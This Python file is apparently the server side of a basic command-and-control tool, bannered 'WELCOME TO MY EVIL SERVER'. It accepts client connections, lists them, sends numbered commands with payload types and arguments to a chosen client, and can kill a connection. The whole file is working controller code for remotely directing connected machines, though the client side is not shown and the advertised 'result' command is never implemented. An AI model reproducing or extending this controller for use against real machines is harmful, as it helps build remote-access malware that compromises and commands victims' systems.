import configparser
import socket
import threading
from _thread import *
from common.colors import bcolors
from tabulate import tabulate

RUNNING = True
connections_dict = {}
messages_counter = 0
config_obj = configparser.ConfigParser()
config_obj.read("common/configfile.ini")
socket_info = config_obj["configuration"]
ServerSideSocket = socket.socket()
host = str(socket_info["host"])
port = int(socket_info["port"])


def show_connections():
    data = []
    for key, value in connections_dict.items():
        data.append([key, host + ":" + key])
    print(tabulate(data, headers=[bcolors.BOLD + "connection id",
                                  "address" + bcolors.ENDC]))


def look_for():
    global connections_dict
    while RUNNING:
        try:
            Client, address = ServerSideSocket.accept()
            print('Connected to: ' + address[0] + ':' + str(address[1]))
            connections_dict[str(address[1])] = Client
            start_new_thread(multi_threaded_client, (Client,))
        except socket.error as e:
            pass


def multi_threaded_client(connection):
    connection.send(str.encode('Server is working:'))
    try:
        while RUNNING:
            data = connection.recv(2048)
            if not data:
                continue
            print(bcolors.HEADER + "Message from client: " + data.decode('utf-8') + bcolors.ENDC)
    except socket.error as e:
        pass


def kill_connection(connection_id):
    connection = connections_dict[connection_id]
    connection.sendall(str.encode("kill"))
    del connections_dict[connection_id]


def print_term_of_use():
    data = [
        ["connections", "shows clients connections", "-"],
        ["send", 'sends command to clients',
         "<connection id> <type> <payload> <arg 1> ... <arg n>"],
        ["kill", "removes client connection", "<connection id>"],
        ["result", "shows command result", "<command id>"],
        ["exit", "yalla bye", "-"]
    ]
    print(
        bcolors.SERVERBLUE + "#### WELCOME TO MY EVIL SERVER ####" + bcolors.ENDC)
    print(tabulate(data, headers=[bcolors.BOLD + "Command Name", "Description",
                                  "Arguments" + bcolors.ENDC]))


def send_command(user_input, connection_id):
    global messages_counter
    connection = connections_dict[connection_id]
    connection.sendall(str.encode(str(messages_counter) + " " + user_input))
    messages_counter += 1


def menu():
    global RUNNING
    print_term_of_use()
    while True:
        user_input = input(bcolors.SERVERBLUE + "server>" + bcolors.ENDC)
        input_parts = user_input.split()
        if len(input_parts) == 0:
            print("Illegal input.")
            print_term_of_use()
            continue
        if input_parts[0] == "connections":
            show_connections()
            continue
        if input_parts[0] == "send":
            send_command(user_input, input_parts[1])
            continue
        if input_parts[0] == "kill":
            kill_connection(input_parts[1])
            continue
        if input_parts[0] == "exit":
            RUNNING = False
            ServerSideSocket.close()
            break
        else:
            print("Illegal input.")
            print_term_of_use()


try:
    ServerSideSocket.bind((host, port))
    ServerSideSocket.listen(5)
    threading.Thread(target=look_for).start()
    threading.Thread(target=menu).start()
except socket.error as e:
    print(str(e))
